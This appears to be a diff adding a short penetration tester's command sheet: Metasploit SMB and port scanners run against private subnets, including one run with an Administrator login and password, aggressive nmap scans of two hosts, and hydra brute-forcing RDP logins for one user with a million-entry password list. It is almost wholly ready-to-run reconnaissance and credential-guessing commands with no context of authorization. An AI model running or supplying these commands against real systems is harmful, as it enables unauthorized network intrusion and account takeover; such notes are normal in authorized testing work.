@@ -1,0 +1,35 @@
+#msfconsole
+
+use auxiliary/scanner/portscan/syn
+set RHOSTS 192.168.1.0/24
+set THREADS 50
+run
+
+use auxiliary/scanner/smb/pipe_auditor
+set RHOSTS 192.168.1.0/24
+run
+
+set SMBPass s3cr3t
+set SMBUser Administrator
+run
+
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.0.1.0/24
+
+
+use auxiliary/scanner/smb/pipe_dcerpc_auditor
+
+use auxiliary/scanner/http/cert
+
+#nmap
+nmap -v -A -sV 10.0.1.5 
+nmap -v -A -sV 10.0.1.6
+
+#password bruteforce
+hydra -t 4 -V -f -l mifurm password.txt rdp://
+
+hydra -t 4 -V -f -l mifurm password.txt rdp://10.0.1.5 
+
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+
+hydra -l mifurm -V -P 10-million-password-list-top-1000000.txt rdp://10.0.1.5
